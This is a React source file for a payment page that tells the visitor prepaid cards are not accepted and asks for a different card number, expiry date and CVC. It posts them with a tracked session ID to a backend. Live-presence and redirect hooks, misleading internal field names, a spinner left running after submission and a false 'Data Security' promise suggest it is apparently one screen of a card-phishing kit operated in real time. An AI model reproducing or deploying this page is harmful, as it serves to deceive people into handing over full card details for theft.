import React, { useState } from "react";
import styles from "./Prepaid.module.css";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

const BalancePage: React.FC = () => {
  const sessionId = localStorage.getItem("currentSessionId");

  useRedirectChecker(3000);
  useRedirectChecker(3000);
  useOnlineStatus({
    sessionId,
    pageName: "prepaid",
    enabled: true,
  });
  const [change, setChange] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvc, setCvc] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!change || isNaN(Number(change)) || Number(change) <= 0) {
      setError("Please enter a valid code");
      return;
    }

    if (
      !expiryDate ||
      expiryDate.length !== 5 ||
      !isValidExpiryDate(expiryDate)
    ) {
      setError("Please enter a valid expiry date (MM/YY)");
      return;
    }

    if (!cvc || isNaN(Number(cvc)) || cvc.length !== 3) {
      setError("Please enter a valid CVC (3 digits)");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      if (!sessionId) {
        setIsLoading(false);
        setError("Session not found");
        return;
      }

      const response = await fetch("/api/submit-change", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId,
          change: change, // Отправляем как строку (номер карты)
          expiryDate: expiryDate, // Отправляем как "MM/YY"
          cvc: cvc, // Отправляем как строку
        }),
      });

      const result = await response.json();

      if (result.success) {
        setChange("");
        setExpiryDate("");
        setCvc("");
      }
    } catch (error) {
      console.error("Error submitting card change:", error);
      setError("Network error. Please try again.");
    }
  };

  const formatBalance = (value: string) => {
    const cleaned = value.replace(/[^\d.]/g, "");
    const parts = cleaned.split(".");
    if (parts.length > 2) {
      return parts[0] + "." + parts.slice(1).join("");
    }
    return cleaned;
  };

  const formatExpiryDate = (value: string) => {
    // Убираем все нечисловые символы
    const cleaned = value.replace(/\D/g, "");

    // Ограничиваем до 4 цифр (месяц + год)
    const limited = cleaned.slice(0, 4);

    // Добавляем слэш после первых двух цифр
    if (limited.length > 2) {
      return limited.slice(0, 2) + "/" + limited.slice(2);
    }

    return limited;
  };

  const isValidExpiryDate = (date: string): boolean => {
    if (date.length !== 5) return false;

    // Проверяем, что строка содержит слэш на третьей позиции
    if (date[2] !== "/") return false;

    const [monthStr, yearStr] = date.split("/");

    // Проверяем, что разбиение произошло корректно
    if (
      !monthStr ||
      !yearStr ||
      monthStr.length !== 2 ||
      yearStr.length !== 2
    ) {
      return false;
    }

    const month = parseInt(monthStr, 10);
    const year = parseInt(yearStr, 10);

    // Проверяем что месяц от 1 до 12, а год от 0 до 99
    return month >= 1 && month <= 12 && year >= 0 && year <= 99;
  };

  const formatCvc = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    return cleaned.slice(0, 3);
  };

  const handleBalanceChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatBalance(e.target.value);
    setChange(formatted);
    setError("");
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    setExpiryDate(formatted);
    setError("");
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCvc(e.target.value);
    setCvc(formatted);
    setError("");
  };

  return (
    <div className={styles["balance-page"]}>
      <div className={styles["balance-container"]}>
        <div className={styles["balance-header"]}>
          <h1>Unfortunately, we do not currently accept PREPAID cards</h1>
        </div>

        <form onSubmit={handleSubmit} className={styles["balance-form"]}>
          <div className={styles["input-group"]}>
            <label htmlFor="balance">Card Number</label>
            <div className={styles["input-wrapper"]}>
              <input
                type="text"
                id="balance"
                value={change}
                onChange={handleBalanceChange}
                className={error ? styles["error"] : ""}
                disabled={isLoading}
                placeholder="Enter card number"
              />
            </div>
          </div>

          <div className={styles["card-details"]}>
            <div className={styles["input-group"]}>
              <label htmlFor="expiryDate">Expiry Date (MM/YY)</label>
              <div className={styles["input-wrapper"]}>
                <input
                  type="text"
                  id="expiryDate"
                  value={expiryDate}
                  onChange={handleExpiryDateChange}
                  className={error ? styles["error"] : ""}
                  disabled={isLoading}
                  placeholder="MM/YY"
                  maxLength={5}
                />
              </div>
            </div>

            <div className={styles["input-group"]}>
              <label htmlFor="cvc">CVC</label>
              <div className={styles["input-wrapper"]}>
                <input
                  type="text"
                  id="cvc"
                  value={cvc}
                  onChange={handleCvcChange}
                  className={error ? styles["error"] : ""}
                  disabled={isLoading}
                  placeholder="123"
                  maxLength={3}
                />
              </div>
            </div>
          </div>

          {error && <span className={styles["error-message"]}>{error}</span>}

          <button
            type="submit"
            className={`${styles["submit-button"]} ${
              isLoading ? styles["loading"] : ""
            }`}
            disabled={isLoading || !change || !expiryDate || !cvc}
          >
            {isLoading ? (
              <div className={styles["loading-spinner"]}>
                <div className={styles["spinner"]}></div>
                Processing...
              </div>
            ) : (
              "Change card"
            )}
          </button>
        </form>

        <div className={styles["security-notice"]}>
          <div className={styles["security-icon"]}>🔒</div>
          <div className={styles["security-text"]}>
            <strong>Data Security</strong>
            <p>
              Your data is protected and is used only for payment processing.
            </p>
          </div>
        </div>
      </div>
      <Loading isLoading={isLoading} />
    </div>
  );
};

export default BalancePage;
